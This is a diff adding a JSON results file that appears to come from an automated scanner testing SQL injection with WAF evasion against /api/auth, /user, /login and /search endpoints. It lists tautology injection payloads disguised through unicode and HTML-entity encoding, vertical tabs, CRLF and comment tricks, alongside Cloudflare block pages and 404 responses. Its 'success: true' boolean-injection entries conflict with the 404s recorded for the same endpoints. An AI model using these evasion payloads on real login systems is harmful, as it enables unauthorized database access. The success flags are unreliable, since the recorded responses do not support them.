@@ -1,0 +1,307 @@
+{
+  "hpp": [],
+  "encoding": [
+    {
+      "technique": "ENCODING",
+      "url": "/api/auth?username=%u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002d%u002d",
+      "encoding": "%u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002d%u002d",
+      "status": 403,
+      "response": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!--<![endif]-->\n<head>\n<title>Attention Required! | Cloudflare</title>\n<meta charset=\"UTF-8\" />\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n<meta http-equiv=\"X-UA-Compatible\" "
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/api/auth?username=&#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#45;&#45;",
+      "encoding": "&#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#45;&#45;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/auth</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/user?user=%u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u0020%u003d%u0020%u0027%u0031",
+      "encoding": "%u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u0020%u003d%u0020%u0027%u0031",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/user?user=&#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;&#61;&#32;&#39;&#49;",
+      "encoding": "&#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;&#61;&#32;&#39;&#49;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/user?username=%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002f%u002a",
+      "encoding": "%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002f%u002a",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/user?username=&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#47;&#42;",
+      "encoding": "&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#47;&#42;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/login?user=%u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u0020%u003d%u0020%u0027%u0031",
+      "encoding": "%u0031%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u0020%u003d%u0020%u0027%u0031",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/login?user=&#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;&#61;&#32;&#39;&#49;",
+      "encoding": "&#49;&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#32;&#61;&#32;&#39;&#49;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/login?username=%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002d%u002d",
+      "encoding": "%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002d%u002d",
+      "status": 403,
+      "response": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en-US\"> <!--<![endif]-->\n<head>\n<title>Attention Required! | Cloudflare</title>\n<meta charset=\"UTF-8\" />\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n<meta http-equiv=\"X-UA-Compatible\" "
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/login?username=&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#45;&#45;",
+      "encoding": "&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#45;&#45;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/search?id=%u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u0031%u0027%u003d%u0027%u0031",
+      "encoding": "%u0027%u0029%u0020%u004f%u0052%u0020%u0028%u0027%u0031%u0027%u003d%u0027%u0031",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/search?id=&#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;&#61;&#39;&#49;",
+      "encoding": "&#39;&#41;&#32;&#79;&#82;&#32;&#40;&#39;&#49;&#39;&#61;&#39;&#49;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/search?user=%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002f%u002a",
+      "encoding": "%u0027%u0020%u004f%u0052%u0020%u0027%u0031%u0027%u003d%u0027%u0031%u0027%u002f%u002a",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "ENCODING",
+      "url": "/search?user=&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#47;&#42;",
+      "encoding": "&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;&#39;&#47;&#42;",
+      "status": 404,
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    }
+  ],
+  "smuggling": [],
+  "timing_sqli": [],
+  "boolean_sqli": [
+    {
+      "technique": "BOOLEAN_SQLI",
+      "endpoint": "/api/auth",
+      "true_length": 5809,
+      "false_length": 5851,
+      "success": true
+    },
+    {
+      "technique": "BOOLEAN_SQLI",
+      "endpoint": "/user",
+      "true_length": 5839,
+      "false_length": 5733,
+      "success": true
+    },
+    {
+      "technique": "BOOLEAN_SQLI",
+      "endpoint": "/login",
+      "true_length": 5766,
+      "false_length": 5809,
+      "success": true
+    },
+    {
+      "technique": "BOOLEAN_SQLI",
+      "endpoint": "/login",
+      "true_length": 5800,
+      "false_length": 5842,
+      "success": true
+    },
+    {
+      "technique": "BOOLEAN_SQLI",
+      "endpoint": "/search",
+      "true_length": 5769,
+      "false_length": 5833,
+      "success": true
+    }
+  ],
+  "ip_rotation": [],
+  "case_variation": [
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/auth</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "CASE_VARIATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    }
+  ],
+  "comment_obfuscation": [
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/auth</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/auth</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/auth</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR--\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR--\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /user</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR--\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR--\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /login</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' %0bOR%0b '1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\t'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    },
+    {
+      "technique": "COMMENT_OBFUSCATION",
+      "payload": "' OR\r\n'1'='1",
+      "response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /search</pre>\n</body>\n</html>\n"
+    }
+  ]
+}
